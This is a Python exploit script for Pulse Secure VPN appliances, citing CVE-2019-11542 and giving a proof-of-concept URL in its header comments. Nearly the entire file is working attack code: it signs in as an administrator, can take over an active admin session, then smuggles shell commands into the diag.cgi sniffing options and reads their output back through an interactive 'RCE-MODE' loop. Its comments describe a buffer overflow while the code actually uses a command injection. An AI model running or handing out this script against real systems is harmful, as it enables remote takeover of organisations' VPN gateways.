#/usr/bin/python3
# CVE-2019-11542
# poc : https://ice.nera.net/dana-admin/auth/hc.cgi?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAACCCC&policyid=0
# offset 43
# There is a stack-based buffer overflow in the following Perl module implementations:
#   /home/perl/auto/DSHC/DSHC.so
#    DSHC::ConsiderForReporting
#    DSHC::isSendReasonStringEnabled
#    DSHC::getRemedCustomInstructions
# These implementations use sprintf to concatenate strings without any length check, which leads to the buffer overflow. 
# The bug can be triggered in many places, but here we use /dana-admin/auth/hc.cgi as our PoC.
import requests,sys,re
from bs4 import BeautifulSoup
from urllib.parse import urlparse,quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
#most of them are using self-signed SSL cert 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Headers for requests
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'en-US,en;q=0.5',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'application/x-www-form-urlencoded',
}

xsAuth = ''
s = requests.Session()

cookies = {
    'lastRealm':'Admin%20Users',
    'DSSIGNIN':'url_admin',
    'DSSignInURL':'/admin/',
    'DSPERSISTMSG':'',
}

def adminLogin(host, user, password):
    global xsAuth


    loginData = {
        'tz_offset': 0,
        'username': user,
        'password': password,
        'realm': 'Admin Users',
        'btnSubmit': 'Sign In',
    }
    # Send the intial request
    r = s.get('https://%s/dana-na/auth/url_admin/welcome.cgi' % urlparse(host).netloc, cookies=cookies, headers=headers, verify=False)
    print('[#] Logging in...')
    r = s.post('https://%s/dana-na/auth/url_admin/login.cgi' % urlparse(host).netloc, data=loginData, verify=False, allow_redirects=False)
    if 'admin-confirm' in r.headers.get('location'):
        print("\n[!] Warning! There's an Active Administrator.")
        print("[https://%s%s]"%(urlparse(host).netloc,r.headers.get('location')))
        r = s.get("https://%s%s"%(urlparse(host).netloc,r.headers.get('location')), allow_redirects=False, verify=False)
        soup=BeautifulSoup(r.text, 'lxml')
        nsoup=soup.find('table',{'border':'border'})
        data=[]
        for i in nsoup.find_all(lambda tag: tag.name=="td" and (len(tag.text)>0)):
            data.append(i.get_text(strip=True))
        for i in range(len(data)-1): 
            if data[i]=="User Name": 
                print("[User] : %s" % data[i+3]) 
            elif data[i]=="Sign-in IP": 
                print("[IP]   : %s" % data[i+3]) 
            elif data[i]=="Sign-in Time": 
                print("[Time] : %s" % data[i+3])
        doIT = str(input("[Y/n]> "))
        if doIT=="Y":
            soup = BeautifulSoup(r.text, 'html.parser')
            xsAuth = soup.find('input',{'name':'xsauth'})['value']
            payload = {
                'btnContinue':'Continue the session',
                'FormDataStr':soup.find('input',{'name':'FormDataStr'})['value'],
                'xsauth':soup.find('input',{'name':'xsauth'})['value']
            }
            r = s.post('https://%s/dana-na/auth/url_admin/login.cgi' % urlparse(host).netloc, data=payload, verify=False, allow_redirects=False)
            c_dsid = re.split('; |, |=', r.headers.get('Set-Cookie'))[re.split('; |, |=', r.headers.get('Set-Cookie')).index('DSID')+1]
            print("\n[+] DSID : {}".format(str(c_dsid)))
            r = s.get('https://%s%s' %(urlparse(host).netloc, r.headers["location"]), verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            xsAuth = soup.find('input', {'name':'xsauth'})["value"]
            print('[+] XSAUTH : {}'.format(str(xsAuth))) 
        else:
            exit()
    elif r.status_code == 302 and 'dashboard.cgi' in r.headers.get('location') or 'DSID' in r.headers.get('Set-Cookie'):
        print("[!] Login Succesfull!")

        c_dsid = re.split('; |, |=', r.headers.get('Set-Cookie'))[re.split('; |, |=', r.headers.get('Set-Cookie')).index('DSID')+1]
        print("[+] DSID : {}".format(str(c_dsid)))

        r = s.get('https://%s%s' %(urlparse(host).netloc, r.headers["location"]), verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        xsAuth = soup.find('input', {'name':'xsauth'})["value"]
        print('[+] XSAUTH : {}'.format(str(xsAuth)))
        

def comInject(host, command):
    s.get("https://%s/dana-admin/diag/diag.cg" % urlparse(host).netloc, cookies=cookies, headers=headers, verify=False)
    url = "https://%s/dana-admin/diag/diag.cgi?a=td&chkInternal=on&optIFInternal=int0&pmisc=on&filter=&options=%s&toggle=Start+Sniffing&xsauth=%s" % (urlparse(host).netloc,quote('-r$x="%s",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <' % command),xsAuth)
    print(url)
    r = s.get(url, allow_redirects=False, verify=False)
    if r.status_code==200:
        with requests.get("https://%s/dana-na/auth/setcookie.cgi" % urlparse(host).netloc, stream=True, allow_redirects=False, verify=False) as data:
            print(data.text.split('\n\n<html>\n<head>\n<meta http-equiv="Content-Language">')[0])
    else:
        print(r.headers)

if __name__=="__main__":
    try:
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        if "https" not in url:
            url = "https://%s/" % url
    except Exception as error:
        print("Just provide me : host username password!")
        exit(1)
    adminLogin(url, username, password)
    com = str(input("\n[RCE-MODE]\n|(Y/n)> "))
    if com=="Y":
        while True:
            com = str(input("> "))
            if com=="exit" or com=="quit":
                print("\n[#] Logout ...")
                s.get("https://%s/dana-na/auth/logout.cgi?xsauth=%s" % (urlparse(url).netloc,xsAuth), verify=False)
                exit()
            comInject(url, com)
    else:
        s.get("https://%s/dana-na/auth/logout.cgi?xsauth=%s" % (urlparse(url).netloc,xsAuth), verify=False)
        exit()

